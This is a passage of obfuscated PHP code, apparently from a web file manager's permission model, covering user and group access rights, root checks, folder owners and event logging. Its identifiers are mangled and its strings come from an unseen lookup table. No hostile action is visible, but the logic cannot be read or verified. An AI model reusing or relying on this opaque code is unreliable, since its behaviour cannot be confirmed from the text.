$¾ı¸§) { continue; } $æÈİµÂü[] = array($ï‰·®å[406] => $¢’°¸ƒÔ[$ï‰·®å[406]], $ï‰·®å[415] => $®ÊÏ¥ÂÓ, $ï‰·®å[507] => intval($“ŒÉáç®), $ï‰·®å[1851] => isset($¸¦ªŞ©ø[$ï‰·®å[395]]) ? intval($¸¦ªŞ©ø[$ï‰·®å[395]]) : 0, $ï‰·®å[1905] => isset($¸¦ªŞ©ø[$ï‰·®å[1905]]) ? intval($¸¦ªŞ©ø[$ï‰·®å[1905]]) : -1); } $æÈİµÂü[] = array($ï‰·®å[406] => $¢’°¸ƒÔ[$ï‰·®å[406]], $ï‰·®å[415] => SourceModel::TYPE_USER, $ï‰·®å[507] => intval($¾ı¸§), $ï‰·®å[1851] => intval($¬¥ş®), $ï‰·®å[1905] => -1); $this->where(array($ï‰·®å[421] => $¢’°¸ƒÔ[$ï‰·®å[406]]))->delete(); $this->addAll($æÈİµÂü); } return !0; } public function get($¼”¨ƒú ) { $É—´îƒ = $this->getSourceList(array($¼”¨ƒú ), !0); return $É—´îƒ[0]; } public function getSourceList($àÇ±„Ö¸, $Ÿº¬¹Ş = false, $öó½Àœ® = false) { $¾¤ëŸş„ =& $_SERVER[Ù×¯Ø…]; if (!$àÇ±„Ö¸) { return array(); } $†Ú´ìæ = Model($¾¤ëŸş„[1253]); if (!$Ÿº¬¹Ş && count($àÇ±„Ö¸) == 1) { $Ÿº¬¹Ş = array(); $Ÿº¬¹Ş[$àÇ±„Ö¸[0]] = $†Ú´ìæ->sourceInfo($àÇ±„Ö¸[0]); } if (!$Ÿº¬¹Ş) { $¬şËêÊë = array($¾¤ëŸş„[421] => array($¾¤ëŸş„[422], $àÇ±„Ö¸)); $Ÿº¬¹Ş = $†Ú´ìæ->field($¾¤ëŸş„[1929])->where($¬şËêÊë)->select(); $Ÿº¬¹Ş = array_to_keyvalue($Ÿº¬¹Ş, $¾¤ëŸş„[406]); } $›À×öÍË = $àÇ±„Ö¸; foreach ($Ÿº¬¹Ş as $àüşíÍ => $Ô† ëÁ¾) { $„¶’ÏÍÍ = $†Ú´ìæ->parentLevelArray($Ô† ëÁ¾[$¾¤ëŸş„[524]]); $›À×öÍË = array_merge($›À×öÍË, array($àüşíÍ), array_reverse($„¶’ÏÍÍ)); } $›À×öÍË = array_values(array_unique($›À×öÍË)); if (!$›À×öÍË) { return array(); } $ë²ö´©Ê = $this->sourceAuthSelect($›À×öÍË); $ò†í›ŒÓ = array(); foreach ($›À×öÍË as $ìŸÔüËÑ) { if (isset($ë²ö´©Ê[$ìŸÔüËÑ])) { $ò†í›ŒÓ[$ìŸÔüËÑ] = $ë²ö´©Ê[$ìŸÔüËÑ]; } } $İğ”ÈÅò = $this->userIsRoot($öó½Àœ®); $±ŸÍ÷·å = AuthModel::authAll(); $€Şõ¯£Æ = array($¾¤ëŸş„[418] => $±ŸÍ÷·å, $¾¤ëŸş„[1930] => array($¾¤ëŸş„[423] => 0, $¾¤ëŸş„[1754] => $±ŸÍ÷·å, $¾¤ëŸş„[424] => LNG($¾¤ëŸş„[1931]), $¾¤ëŸş„[1770] => $¾¤ëŸş„[1932])); $Ç•óÙş = array(); foreach ($Ÿº¬¹Ş as $ìŸÔüËÑ => $ç”ñªÀ) { if ($İğ”ÈÅò) { $Ç•óÙş[$ìŸÔüËÑ] = $€Şõ¯£Æ; continue; } $Ç•óÙş[$ìŸÔüËÑ] = $this->makeSourceAuth($ç”ñªÀ, $ò†í›ŒÓ, $öó½Àœ®); } return $Ç•óÙş; } public function authDeepCheck($ëùŒâ”¢, $ã¡™Ìæ– = false) { $Å—Õóë =& $_SERVER[Ù×¯Ø…]; $ã¡™Ìæ– = $ã¡™Ìæ– ? $ã¡™Ìæ– : USER_ID; $şÑ¨ı¼˜ = $this->makeAuthDeep($ã¡™Ìæ–); if (!in_array($ëùŒâ”¢, $şÑ¨ı¼˜[$Å—Õóë[1933]])) { return !1; } $ÑË·ÆƒÌ = array(); foreach ($şÑ¨ı¼˜[$Å—Õóë[1934]] as $É‹ØÏ¿º => $Š–Üî±­) { if (!in_array($ëùŒâ”¢, $Š–Üî±­)) { continue; } $ÑË·ÆƒÌ[] = $É‹ØÏ¿º; } if (!$ÑË·ÆƒÌ) { return !1; } $œ¶Ÿ¡Æ = $ÑË·ÆƒÌ ? $ÑË·ÆƒÌ[0] : $ëùŒâ”¢; return array($Å—Õóë[418] => -1, $Å—Õóë[469] => array($Å—Õóë[423] => $Å—Õóë[1120], $Å—Õóë[1754] => $Å—Õóë[191], $Å—Õóë[424] => LNG($Å—Õóë[1935]), $Å—Õóë[1770] => $Å—Õóë[1936]), $Å—Õóë[1937] => LNG($Å—Õóë[1938]), $Å—Õóë[1939] => $this->sourceAuthInfo($œ¶Ÿ¡Æ)); } protected function makeAuthDeep($ö±•äõª = false) { $‰èĞò =& $_SERVER[Ù×¯Ø…]; static $Šš¨¬Ô = array(); $ö±•äõª = $ö±•äõª ? $ö±•äõª : USER_ID; if (isset($Šš¨¬Ô[$ö±•äõª])) { return $Šš¨¬Ô[$ö±•äõª]; } $ÙƒÎ¦şê = Model($‰èĞò[1940])->listData(); $Û¢á—ƒƒ = array(); foreach ($ÙƒÎ¦şê as $˜û¤í†œ) { if ($˜û¤í†œ[$‰èĞò[417]] == 0 && $˜û¤í†œ[$‰èĞò[1769]] == $‰èĞò[87]) { $Û¢á—ƒƒ[] = $˜û¤í†œ[$‰èĞò[395]]; } } $îÌÈÙ‡ä = $this->userGroupParents($ö±•äõª); $¿û¿˜ù = array($‰èĞò[415] => SourceModel::TYPE_USER, $‰èĞò[507] => $ö±•äõª); if ($îÌÈÙ‡ä) { $¿û¿˜ù = array(array($‰èĞò[415] => SourceModel::TYPE_USER, $‰èĞò[507] => $ö±•äõª), array($‰èĞò[415] => SourceModel::TYPE_GROUP, $‰èĞò[507] => array($‰èĞò[422], $îÌÈÙ‡ä)), $‰èĞò[996] => $‰èĞò[1843]); } $ÌÆÂÇ¡© = $this->field($‰èĞò[1941])->where($¿û¿˜ù)->select(); $Ÿ’ØìØÃ = array(); $ğœºË’ô = array_to_keyvalue_group($ÌÆÂÇ¡©, $‰èĞò[406]); foreach ($ğœºË’ô as $ªí‹„†¾ => $¢Ö‘‹«¤) { $¤ğ•Üİ = $this->authArrayCheck($¢Ö‘‹«¤, $ö±•äõª); if ($¤ğ•Üİ[$‰èĞò[418]] > 0) { $Ÿ’ØìØÃ[] = $ªí‹„†¾ . $‰èĞò[33]; } } $Ã«Ğ­ñ£ = array(); $ùÖÃÅšÁ = $îÌÈÙ‡ä; $‰ş‚Âëİ = Model($‰èĞò[1253]); $°Šœ¸„Ş = Model($‰èĞò[525]); $î’¨êù¾ = array(); $õ÷´¢ç¿ = array(); $„Í “ƒ = array(); $Ûƒ‹½ôı = array(); if ($Ÿ’ØìØÃ) { $®Ò€ıÊØ = $‰ş‚Âëİ->where(array($‰èĞò[406] => array($‰èĞò[422], $Ÿ’ØìØÃ)))->select(); foreach ($®Ò€ıÊØ as $°«ìşŸÖ) { $­öäÓåÜ = $‰ş‚Âëİ->parentLevelArray($°«ìşŸÖ[$‰èĞò[524]]); $Ã«Ğ­ñ£ = array_merge($Ã«Ğ­ñ£, $­öäÓåÜ); $ùÖÃÅšÁ[] = $°«ìşŸÖ[$‰èĞò[507]]; $î’¨êù¾[$°«ìşŸÖ[$‰èĞò[406]]] = $­öäÓåÜ; $õ÷´¢ç¿[$°«ìşŸÖ[$‰èĞò[406]]] = $°«ìşŸÖ[$‰èĞò[507]]; } } $ùÖÃÅšÁ = array_values(array_unique($ùÖÃÅšÁ)); $í·İƒ‰£ = $ùÖÃÅšÁ; foreach ($í·İƒ‰£ as $¯›ºáÌÂ) { $°€Íµñ¸ = $°Šœ¸„Ş->getInfo($¯›ºáÌÂ); $­öäÓåÜ = $‰ş‚Âëİ->parentLevelArray($°€Íµñ¸[$‰èĞò[524]]); $ùÖÃÅšÁ = array_merge($ùÖÃÅšÁ, $­öäÓåÜ); } $ùÖÃÅšÁ = array_values(array_unique($ùÖÃÅšÁ)); foreach ($ùÖÃÅšÁ as $¯›ºáÌÂ) { $°€Íµñ¸ = $°Šœ¸„Ş->getInfo($¯›ºáÌÂ); $Ã«Ğ­ñ£[] = $°€Íµñ¸[$‰èĞò[85]][$‰èĞò[406]]; $„Í “ƒ[$¯›ºáÌÂ] = $°€Íµñ¸[$‰èĞò[85]][$‰èĞò[406]]; $Ûƒ‹½ôı[$¯›ºáÌÂ] = $‰ş‚Âëİ->parentLevelArray($°€Íµñ¸[$‰èĞò[524]]); } foreach ($î’¨êù¾ as $À€’Á†Ö => $–­€¿ú) { $†õÎ†Îİ = $õ÷´¢ç¿[$À€’Á†Ö]; if (!$†õÎ†Îİ || !$„Í “ƒ[$†õÎ†Îİ]) { continue; } $·—Âîî = array(); foreach ($Ûƒ‹½ôı[$†õÎ†Îİ] as $¯›ºáÌÂ) { $·—Âîî[] = $„Í “ƒ[$¯›ºáÌÂ]; } $î’¨êù¾[$À€’Á†Ö] = array_merge($·—Âîî, $–­€¿ú); } $Ã«Ğ­ñ£ = array_values(array_unique($Ã«Ğ­ñ£)); $åÚŞöó— = array($‰èĞò[1933] => $Ã«Ğ­ñ£, $‰èĞò[1934] => $î’¨êù¾); $Šš¨¬Ô[$ö±•äõª] = $åÚŞöó—; return $åÚŞöó—; } private function makeSourceAuth($³™ùÑÆ, $¿ğ‚§Ú, $Á³ëÁ€Ÿ = false) { $€÷ó‚å² =& $_SERVER[Ù×¯Ø…]; $éëóñ¾£ = $€÷ó‚å²[87]; $êª¼ğº£ = $³™ùÑÆ[$€÷ó‚å²[507]]; $ñ£‹îò† = $³™ùÑÆ[$€÷ó‚å²[415]] == SourceModel::TYPE_GROUP; $¸Ï‰Ò™ = $ñ£‹îò† ? $this->groupRootAuth($êª¼ğº£, $Á³ëÁ€Ÿ) : !1; if ($¸Ï‰Ò™ && Model($€÷ó‚å²[510])->authCheckAction($¸Ï‰Ò™[$€÷ó‚å²[417]], $€÷ó‚å²[1768])) { return $this->groupAuthInfo($¸Ï‰Ò™, $êª¼ğº£); } $Í¾Ù×˜Ø = Model($€÷ó‚å²[1253])->parentLevelArray($³™ùÑÆ[$€÷ó‚å²[524]]); $Í¾Ù×˜Ø = array_merge(array($³™ùÑÆ[$€÷ó‚å²[406]]), array_reverse($Í¾Ù×˜Ø)); $Î’Š² = !1; foreach ($Í¾Ù×˜Ø as $¶Ÿğ´£÷) { if (!isset($¿ğ‚§Ú[$¶Ÿğ´£÷])) { continue; } $œ›¦›Ğá = $this->authMake($¿ğ‚§Ú[$¶Ÿğ´£÷], $Á³ëÁ€Ÿ); if ($œ›¦›Ğá[$€÷ó‚å²[469]]) { $Î’Š² = $œ›¦›Ğá; break; } } if (!$ñ£‹îò†) { return $Î’Š²; } if (!$Î’Š² && $¸Ï‰Ò™) { $Î’Š² = $this->groupAuthInfo($¸Ï‰Ò™, $êª¼ğº£); } if (!$Î’Š²) { $§ûçÅ• = Model($€÷ó‚å²[525])->getInfo($êª¼ğº£); $À›è¦™… = explode($€÷ó‚å²[47], trim($§ûçÅ•[$€÷ó‚å²[524]], $€÷ó‚å²[47])); $À›è¦™… = array_reverse($À›è¦™…); foreach ($À›è¦™… as $µ°Ùş±à) { if ($µ°Ùş±à == $€÷ó‚å²[191] || $µ°Ùş±à == $éëóñ¾£) { continue; } $ì÷Œú¡¼ = $this->groupRootAuth($µ°Ùş±à, $Á³ëÁ€Ÿ); if (!$ì÷Œú¡¼) { continue; } $Î’Š² = $this->groupAuthInfo($ì÷Œú¡¼, $µ°Ùş±à); break; } } if (!$Î’Š² || $Î’Š²[$€÷ó‚å²[418]] <= 0) { $ …„ = $this->authDeepCheck($³™ùÑÆ[$€÷ó‚å²[406]], $Á³ëÁ€Ÿ); if ($ …„) { $Î’Š² = $ …„; } } return $Î’Š²; } private function userIsRoot($«¹ÔÆˆ = false) { $†ÏÊˆ˜Ñ =& $_SERVER[Ù×¯Ø…]; if (!$«¹ÔÆˆ && _get($GLOBALS, $†ÏÊˆ˜Ñ[508])) { return !0; } $‡‚æ„Š = Model($†ÏÊˆ˜Ñ[541])->getInfo($«¹ÔÆˆ); $ßÏŠ¥€“ = Model($†ÏÊˆ˜Ñ[1942])->listData($‡‚æ„Š[$†ÏÊˆ˜Ñ[1459]]); if ($ßÏŠ¥€“ && $ßÏŠ¥€“[$†ÏÊˆ˜Ñ[514]][$†ÏÊˆ˜Ñ[1943]] == 1) { return !0; } return !1; } private function sourceAuthInfo($÷´–óÍÊ) { $¹Û•œó® =& $_SERVER[Ù×¯Ø…]; $®©èèá¼ = Model($¹Û•œó®[1253]); $œì¥çÀ‘ = $®©èèá¼->sourceInfo($÷´–óÍÊ); if (!$œì¥çÀ‘) { return !1; } $®©èèá¼->groupPathDisplay($œì¥çÀ‘); $£”™úŞ = array($œì¥çÀ‘); $£”™úŞ = $®©èèá¼->_listAppendPath($£”™úŞ); $œì¥çÀ‘ = $£”™úŞ[0]; $òÛø ¸§ = $œì¥çÀ‘[$¹Û•œó®[522]]; if (isset($œì¥çÀ‘[$¹Û•œó®[530]])) { $Ñ„º¶Ÿ€ = explode($¹Û•œó®[8], trim($œì¥çÀ‘[$¹Û•œó®[522]], $¹Û•œó®[8])); array_shift($Ñ„º¶Ÿ€); $òÛø ¸§ = $œì¥çÀ‘[$¹Û•œó®[528]] . $¹Û•œó®[1944] . implode($¹Û•œó®[8], $Ñ„º¶Ÿ€); } return array($¹Û•œó®[424] => $œì¥çÀ‘[$¹Û•œó®[28]], $¹Û•œó®[76] => KodIO::make($œì¥çÀ‘[$¹Û•œó®[406]]), $¹Û•œó®[1945] => $òÛø ¸§); } private function groupAuthInfo($À›É‹ÜÄ, $ÆİéóÀ) { $¨½›ğ÷ =& $_SERVER[Ù×¯Ø…]; $åŞúÛÁä = Model($¨½›ğ÷[525])->getInfo($ÆİéóÀ); return array($¨½›ğ÷[1946] => intval($À›É‹ÜÄ[$¨½›ğ÷[417]]), $¨½›ğ÷[1930] => $À›É‹ÜÄ, $¨½›ğ÷[1947] => LNG($¨½›ğ÷[1948]), $¨½›ğ÷[1939] => array($¨½›ğ÷[424] => $åŞúÛÁä[$¨½›ğ÷[28]], $¨½›ğ÷[76] => KodIO::make($åŞúÛÁä[$¨½›ğ÷[85]][$¨½›ğ÷[406]]), $¨½›ğ÷[1945] => $åŞúÛÁä[$¨½›ğ÷[529]])); } protected function groupRootAuth($ŠèŒ¢¬», $æƒ²Úéö = false) { $êÄÎÈª =& $_SERVER[Ù×¯Ø…]; $æƒ²Úéö = $æƒ²Úéö ? $æƒ²Úéö : USER_ID; $Ú€ëŠ¬Ñ = $æƒ²Úéö . $êÄÎÈª[1949] . $ŠèŒ¢¬»; static $Û’Ó­ı = array(); if (isset($Û’Ó­ı[$Ú€ëŠ¬Ñ])) { return $Û’Ó­ı[$Ú€ëŠ¬Ñ]; } $œÔ¼ÛÇÑ = Model($êÄÎÈª[525])->getInfo($ŠèŒ¢¬»); $ˆšÜ©è = $this->userGroupList($æƒ²Úéö); $†³éò•ò = isset($ˆšÜ©è[$ŠèŒ¢¬»]) ? $ˆšÜ©è[$ŠèŒ¢¬»][$êÄÎÈª[417]] : !1; if ($†³éò•ò && Model($êÄÎÈª[510])->authCheckAction($†³éò•ò[$êÄÎÈª[417]], $êÄÎÈª[1768])) { $Û’Ó­ı[$Ú€ëŠ¬Ñ] = $†³éò•ò; return $†³éò•ò; } $ÖäÙï÷ò = $this->sourceAuthSelect($œÔ¼ÛÇÑ[$êÄÎÈª[85]][$êÄÎÈª[406]]); $†š’™çò = $ÖäÙï÷ò ? $this->authMake($ÖäÙï÷ò, $æƒ²Úéö) : !1; $‚óóªÉÈ = $†š’™çò ? $†š’™çò[$êÄÎÈª[469]] : !1; $Û’Ó­ı[$Ú€ëŠ¬Ñ] = $‚óóªÉÈ ? $‚óóªÉÈ : $†³éò•ò; return $Û’Ó­ı[$Ú€ëŠ¬Ñ]; } public function authOwnerApply($„û²Çî´) { $ ı¹Œ¥‘ =& $_SERVER[Ù×¯Ø…]; if (empty($„û²Çî´[$ ı¹Œ¥‘[417]]) || isset($„û²Çî´[$ ı¹Œ¥‘[1950]]) && $„û²Çî´[$ ı¹Œ¥‘[1950]]) { return $„û²Çî´; } if (AuthModel::authCheckRoot($„û²Çî´[$ ı¹Œ¥‘[417]][$ ı¹Œ¥‘[418]])) { return $„û²Çî´; } $ô¿ƒü¬™ = Model($ ı¹Œ¥‘[1253])->parentLevelArray($„û²Çî´[$ ı¹Œ¥‘[524]]); $ô¿ƒü¬™ = array_merge(array($„û²Çî´[$ ı¹Œ¥‘[406]]), array_reverse($ô¿ƒü¬™)); $ŠÛñ÷” = $this->sourceAuthSelect($ô¿ƒü¬™); $‹–Ë¢ = array(); $Ï‘›ª‚¬ = array(); foreach ($ŠÛñ÷” as $íæô ÀÉ => $úÉ¾â…) { $ÅÖèÚÈĞ = $this->authFolderOwnerUser($úÉ¾â…); $‹–Ë¢[$íæô ÀÉ] = $ÅÖèÚÈĞ; $Ï‘›ª‚¬ = array_merge($Ï‘›ª‚¬, $ÅÖèÚÈĞ[$ ı¹Œ¥‘[597]]); if ($ÅÖèÚÈĞ[$ ı¹Œ¥‘[1951]]) { break; } } if (count($Ï‘›ª‚¬) == 0) { $Ï‘›ª‚¬ = $this->authFolderOwnerGroup($„û²Çî´[$ ı¹Œ¥‘[507]]); } $Ï‘›ª‚¬ = array_unique($Ï‘›ª‚¬); if (AuthModel::authCheckRoot($„û²Çî´[$ ı¹Œ¥‘[417]][$ ı¹Œ¥‘[418]])) { $Ï‘›ª‚¬[] = USER_ID; } $„û²Çî´[$ ı¹Œ¥‘[417]][$ ı¹Œ¥‘[1952]] = Model($ ı¹Œ¥‘[516])->userListInfo($Ï‘›ª‚¬); return $„û²Çî´; } private function authFolderOwnerGroup($¦õëœ›ê) { $¤†¼Ÿú¶ =& $_SERVER[Ù×¯Ø…]; $ßáçøŒÃ = Model($¤†¼Ÿú¶[1837])->where(array($¤†¼Ÿú¶[1748] => $¦õëœ›ê))->select(); $ËÄÀ²ì = array(); if (!$ßáçøŒÃ) { return $ËÄÀ²ì; } foreach ($ßáçøŒÃ as $Ğˆò§å) { $èÔ¢’Š = $this->authInfo($Ğˆò§å); if (AuthModel::authCheckRoot($èÔ¢’Š[$¤†¼Ÿú¶[417]])) { $ËÄÀ²ì[] = $Ğˆò§å[$¤†¼Ÿú¶[1580]]; } } return $ËÄÀ²ì; } private function authFolderOwnerUser($™¬é“•Á) { $±¥ÆíØã =& $_SERVER[Ù×¯Ø…]; $²÷ëºÎ« = array(); $ê±ïæÙ = !1; foreach ($™¬é“•Á as $íÍØÆÉÔ) { $¨Æ¡Šı— = $this->authInfo($íÍØÆÉÔ); if ($íÍØÆÉÔ[$±¥ÆíØã[507]] == $±¥ÆíØã[191]) { $ê±ïæÙ = !0; } if ($íÍØÆÉÔ[$±¥ÆíØã[415]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($¨Æ¡Šı—[$±¥ÆíØã[417]])) { $²÷ëºÎ«[] = $íÍØÆÉÔ[$±¥ÆíØã[507]]; } } } return array($±¥ÆíØã[597] => $²÷ëºÎ«, $±¥ÆíØã[1951] => $ê±ïæÙ); } public function authMake($ˆ²ó»œü, $ëäß²¯µ = false) { $Ô‡Ã¼°Æ =& $_SERVER[Ù×¯Ø…]; $ùø÷ôàÏ = $this->authArrayCheck($ˆ²ó»œü, $ëäß²¯µ); if ($ùø÷ôàÏ[$Ô‡Ã¼°Æ[1953]]) { $ùø÷ôàÏ[$Ô‡Ã¼°Æ[1953]] = $this->sourceAuthInfo($ùø÷ôàÏ[$Ô‡Ã¼°Æ[1953]]); } return $ùø÷ôàÏ; } public function authArrayCheck($‰±Ôô«Œ, $«¦Œ®Ğİ = false) { $Ê¾Á–£± =& $_SERVER[Ù×¯Ø…]; if (!$‰±Ôô«Œ) { return array($Ê¾Á–£±[418] => 0, $Ê¾Á–£±[469] => !1); } $«¦Œ®Ğİ = $«¦Œ®Ğİ ? $«¦Œ®Ğİ : USER_ID; $ó§áÎ¿Ğ = 0; $ş½¡µÓà = 0; $Ñõ—‡î„ = 0; $İÄßàİ = 0; $ãºÁæò = 0; $Òõáûæö = 0; $ÕÄª¤ûï = 1000; $§ßĞ€• = 0; $¼¯à²ä‚ = 0; $İ¹°¶å« = 0; $Ó í†¥Ÿ = 0; $ÅòÅîĞ« = array($Ê¾Á–£±[406] => 0); foreach ($‰±Ôô«Œ as $ÅòÅîĞ«) { $å‚–ªî» = $this->authInfo($ÅòÅîĞ«); if (!$å‚–ªî») { continue; } $ÀÕàÆ¸¡ = $ÅòÅîĞ«[$Ê¾Á–£±[507]]; $ğµĞéò = intval($å‚–ªî»[$Ê¾Á–£±[417]]); if ($ÅòÅîĞ«[$Ê¾Á–£±[415]] == SourceModel::TYPE_USER && $ÀÕàÆ¸¡ == $«¦Œ®Ğİ) { $ó§áÎ¿Ğ = !0; $Ñõ—‡î„ = $å‚–ªî»; $ş½¡µÓà = $ğµĞéò; } else { if ($ÅòÅîĞ«[$Ê¾Á–£±[415]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ÀÕàÆ¸¡, $«¦Œ®Ğİ)) { $İÄßàİ = !0; $Ñ²”ûÚÁ = $this->groupStepToUserGroup($ÀÕàÆ¸¡, $«¦Œ®Ğİ); if ($Ñ²”ûÚÁ < $ÕÄª¤ûï) { $ÕÄª¤ûï = $Ñ²”ûÚÁ; $ãºÁæò = $ğµĞéò; $Òõáûæö = $å‚–ªî»; $§ßĞ€• = $ÀÕàÆ¸¡; } if ($Ñ²”ûÚÁ == $ÕÄª¤ûï && $ğµĞéò >= $ãºÁæò) { $ãºÁæò = $ğµĞéò; $Òõáûæö = $å‚–ªî»; $§ßĞ€• = $ÀÕàÆ¸¡; } } else { if ($ÀÕàÆ¸¡ == $Ê¾Á–£±[191]) { $¼¯à²ä‚ = !0; $Ó í†¥Ÿ = $å‚–ªî»; $İ¹°¶å« = $ğµĞéò; } } } } if ($ó§áÎ¿Ğ) { $ÂùäÏ ‘ = $ş½¡µÓà; $å‚–ªî» = $Ñõ—‡î„; $ş÷²”« = LNG($Ê¾Á–£±[1954]); } else { if ($İÄßàİ) { $ÂùäÏ ‘ = $ãºÁæò; $å‚–ªî» = $Òõáûæö; $Ê˜ƒö‰ğ = Model($Ê¾Á–£±[525])->getInfo($§ßĞ€•); $ş÷²”« = $Ê¾Á–£±[160] . $Ê˜ƒö‰ğ[$Ê¾Á–£±[529]] . $Ê¾Á–£±[1955] . LNG($Ê¾Á–£±[1956]); } else { if ($¼¯à²ä‚) { $ÂùäÏ ‘ = $İ¹°¶å«; $å‚–ªî» = $Ó í†¥Ÿ; $ş÷²”« = LNG($Ê¾Á–£±[1927]); } else { $ÂùäÏ ‘ = 0; $å‚–ªî» = !1; $ş÷²”« = $Ê¾Á–£±[33]; } } } $†µÙ£˜û = array($Ê¾Á–£±[1946] => intval($ÂùäÏ ‘), $Ê¾Á–£±[1930] => $å‚–ªî», $Ê¾Á–£±[1947] => $ş÷²”«, $Ê¾Á–£±[1939] => $ÅòÅîĞ«[$Ê¾Á–£±[406]]); return $†µÙ£˜û; } private function groupContainUser($‰ùĞ©ªı, $å³Ò•„´ = false) { return in_array($‰ùĞ©ªı, $this->userGroupParents($å³Ò•„´)); } private function groupStepToUserGroup($°¸»“Ğ®, $óí¬†÷ı = false) { $´””Ø¢Æ =& $_SERVER[Ù×¯Ø…]; $ö“²ÔÖ = $this->userGroupList($óí¬†÷ı); $Ëƒ×¦ = 1000; $§î½‘Ô‹ = $GLOBALS[$´””Ø¢Æ[6]][$´””Ø¢Æ[88]][$´””Ø¢Æ[1848]] == 1; $ÖÀ’áìó = $§î½‘Ô‹ ? 3 : 2; foreach ($ö“²ÔÖ as $“°ˆ«Ôè) { if ($“°ˆ«Ôè[$´””Ø¢Æ[1748]] == $°¸»“Ğ®) { return 0; } $»“¡ÙĞÎ = explode($´””Ø¢Æ[47], trim($“°ˆ«Ôè[$´””Ø¢Æ[524]], $´””Ø¢Æ[47])); if ($»“¡ÙĞÎ[0] == $´””Ø¢Æ[191] && count($»“¡ÙĞÎ) > $ÖÀ’áìó) { $çÇó‘œ = array_reverse(array_slice($»“¡ÙĞÎ, $ÖÀ’áìó)); $ç˜Ûè¯Ö = array_search($°¸»“Ğ®, $çÇó‘œ); if ($ç˜Ûè¯Ö !== !1 && $ç˜Ûè¯Ö + 1 <= $Ëƒ×¦) { $Ëƒ×¦ = $ç˜Ûè¯Ö + 1; } } } return $Ëƒ×¦; } private function userGroupList($­€ø¸ë = false) { $Ó‡ê—– =& $_SERVER[Ù×¯Ø…]; static $¸’ĞÆâ« = array(); if (isset($¸’ĞÆâ«[$­€ø¸ë])) { return $¸’ĞÆâ«[$­€ø¸ë]; } $¡Ï˜á¶õ = Model($Ó‡ê—–[541])->getInfo($­€ø¸ë); $¸’ĞÆâ«[$­€ø¸ë] = array_to_keyvalue($¡Ï˜á¶õ[$Ó‡ê—–[1928]], $Ó‡ê—–[1748]); return $¸’ĞÆâ«[$­€ø¸ë]; } public function userGroupParents($Õ¶·Óä•) { $­ÅŒ•«  =& $_SERVER[Ù×¯Ø…]; static $œøöÑ‚  = array(); $Õ¶·Óä• = $Õ¶·Óä• ? $Õ¶·Óä• : USER_ID; if (isset($œøöÑ‚ [$Õ¶·Óä•])) { return $œøöÑ‚ [$Õ¶·Óä•]; } $•™Ëìà¹ = $this->userGroupList($Õ¶·Óä•); $×úÍ¡í = array(); $åìˆçØ÷ = $GLOBALS[$­ÅŒ•« [6]][$­ÅŒ•« [88]][$­ÅŒ•« [1848]] == 1; $–ÇÑ„¢„ = $åìˆçØ÷ ? 3 : 2; foreach ($•™Ëìà¹ as $ùÙ©„›ï) { $©Ÿ›èíí = array($ùÙ©„›ï[$­ÅŒ•« [1748]]); $ïÓ®æ = explode($­ÅŒ•« [47], trim($ùÙ©„›ï[$­ÅŒ•« [524]], $­ÅŒ•« [47])); if ($ïÓ®æ[0] == $­ÅŒ•« [191] && count($ïÓ®æ) > $–ÇÑ„¢„) { $Êéñ‡İ = array_slice($ïÓ®æ, $–ÇÑ„¢„); $©Ÿ›èíí = array_merge($©Ÿ›èíí, array_reverse($Êéñ‡İ)); } $×úÍ¡í = array_merge($×úÍ¡í, $©Ÿ›èíí); } $œøöÑ‚ [$Õ¶·Óä•] = array_unique($×úÍ¡í); return $œøöÑ‚ [$Õ¶·Óä•]; } public function authTargetInfoMake($Š²ÆĞ) { $ÑáªÙÊ€ =& $_SERVER[Ù×¯Ø…]; $ú†ûöƒ = array(); $ì¡­¢« = array(); foreach ($Š²ÆĞ as $ï¨È²©Ä) { if ($ï¨È²©Ä[$ÑáªÙÊ€[415]] == SourceModel::TYPE_USER) { $ú†ûöƒ[] = intval($ï¨È²©Ä[$ÑáªÙÊ€[507]]); } else { if ($ï¨È²©Ä[$ÑáªÙÊ€[415]] == SourceModel::TYPE_GROUP) { $ì¡­¢«[] = intval($ï¨È²©Ä[$ÑáªÙÊ€[507]]); } } } if ($ú†ûöƒ) { $ú†ûöƒ = Model($ÑáªÙÊ€[516])->userListInfo($ú†ûöƒ); } if ($ì¡­¢«) { $Íù€†Ìƒ = array($ÑáªÙÊ€[1835] => array($ÑáªÙÊ€[422], $ì¡­¢«)); $ì¡­¢« = Model($ÑáªÙÊ€[525])->field($ÑáªÙÊ€[1957])->where($Íù€†Ìƒ)->select(); $ì¡­¢« = array_to_keyvalue($ì¡­¢«, $ÑáªÙÊ€[1748]); } return array($ÑáªÙÊ€[1958] => $ú†ûöƒ, $ÑáªÙÊ€[1959] => $ì¡­¢«); } public function authInfo($µŒì÷²Â) { $…¤æËÊº =& $_SERVER[Ù×¯Ø…]; if ($µŒì÷²Â[$…¤æËÊº[1851]]) { $Ø…½Ş = Model($…¤æËÊº[510])->listData($µŒì÷²Â[$…¤æËÊº[1851]]); if (!$Ø…½Ş) { return !1; $Ç°Î¨ü = Model($…¤æËÊº[510])->listData(); $Š”ãù·Œ = array_filter_by_field($Ç°Î¨ü, $…¤æËÊº[417], $…¤æËÊº[191]); return $Š”ãù·Œ; } $¶òı£¨ = array_field_key($Ø…½Ş, array($…¤æËÊº[395], $…¤æËÊº[28], $…¤æËÊº[417], $…¤æËÊº[1770], $…¤æËÊº[1771])); $¶òı£¨[$…¤æËÊº[1960]] = $µŒì÷²Â; return $¶òı£¨; } else { return array($…¤æËÊº[423] => 0, $…¤æËÊº[1754] => $µŒì÷²Â[$…¤æËÊº[1905]], $…¤æËÊº[424] => $…¤æËÊº[33], $…¤æËÊº[1770] => $…¤æËÊº[1961]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\x75\162\x63\x65\x5f\145\166\145\x6e\164"; protected $dataAuto = array(array("\x63\162\145\x61\x74\145\124\151\x6d\x65", "\164\151\155\145", "\x69\x6e\x73\x65\162\164", "\146\x75\156\x63\164\151\x6f\156"), array("\x64\145\163\x63", '', "\x69\x6e\163\x65\162\x74\x2c\165\160\x64\x61\x74\145\54\163\x65\x6c\145\143\x74", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ßƒØÈÕ›, $Ó­ÅÅúœ, $¤ôşƒ = '') { $‡›†Ò‘‹ =& $_SERVER[Ù×¯Ø…]; if (!$this->eventSave) { return; } $á´Ÿ³†Ã = Model($‡›†Ò‘‹[1253])->sourceInfo($ßƒØÈÕ›); if (!$á´Ÿ³†Ã) { return !1; } if 